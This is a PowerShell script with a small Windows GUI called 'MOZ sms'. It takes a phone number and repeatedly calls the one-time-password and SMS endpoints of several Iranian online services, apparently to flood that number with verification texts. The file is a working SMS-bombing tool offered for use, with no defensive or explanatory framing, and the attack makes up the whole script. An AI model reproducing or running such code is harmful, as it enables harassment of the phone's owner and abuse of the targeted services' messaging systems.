Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form
$form.Text = "MOZ sms"
$form.Size = New-Object Drawing.Size(500, 300)
$form.BackColor = '#000000'
$form.Icon = New-Object system.drawing.icon("C:\Users\hooma\Desktop\Martin-Berube-Food-Banana.256.ico")

$label = New-Object Windows.Forms.Label
$label.Text = "MOZ sms"
$label.AutoSize = $true
$label.ForeColor = "Green"
$label.Location = New-Object System.Drawing.Point(160, 20)
$label.Font = New-Object Drawing.Font("Microsoft Sans Serif", 24, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label)

$label2 = New-Object Windows.Forms.Label
$label2.Text = "Enter Number"
$label2.ForeColor = "Gray"
$label2.AutoSize = $true
$label2.Location = New-Object System.Drawing.Point(190, 68)
$label2.Font = New-Object Drawing.Font("Microsoft Sans Serif", 10, [Drawing.FontStyle]::Bold)
$form.Controls.Add($label2)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(150, 100)
$textBox.Size = New-Object System.Drawing.Size(180)
$textBox.BackColor = 'white'
$textBox.Font = New-Object Drawing.Font("Microsoft Sans Serif", 15, [Drawing.FontStyle]::Bold)
$form.Controls.Add($textBox)

$Button = New-Object System.Windows.Forms.Button
$Button.Location = New-Object System.Drawing.Size(180,150)
$Button.Size = New-Object System.Drawing.Size(120,50)
$Button.Font = New-Object Drawing.Font("Microsoft Sans Serif", 13, [Drawing.FontStyle]::Bold)
$Button.Padding = New-Object System.Windows.Forms.Padding(5)
$Button.Text = "Start"
$Button.ForeColor = 'black'
$Button.BackColor = 'white'
$Form.Controls.Add($Button)
$Button.Add_Click({
    $inp = +$textBox.Text
    for ($i = 0; $i -lt 4; $i++) {
        Start-Sleep -Seconds 5
    Invoke-WebRequest -Uri https://api.torob.com/a/phone/send-pin/?phone_number=+98$inp
    Start-Sleep -Seconds 5
    Invoke-WebRequest -Uri https://api-v2.filmnet.ir/access-token/users/98$inp/otp
    Start-Sleep -Seconds 5
    Invoke-WebRequest -Uri https://api.snapp.ir/api/v1/sms/link -Body @{"phone"=$inp} -Method POST
    Start-Sleep -Seconds 5
    Invoke-WebRequest -Uri https://core.gap.im/v1/user/add.json?mobile=+98$inp
    }
    [System.Windows.Forms.MessageBox]::Show("sending : $inp")
})

[Windows.Forms.Application]::Run($form)
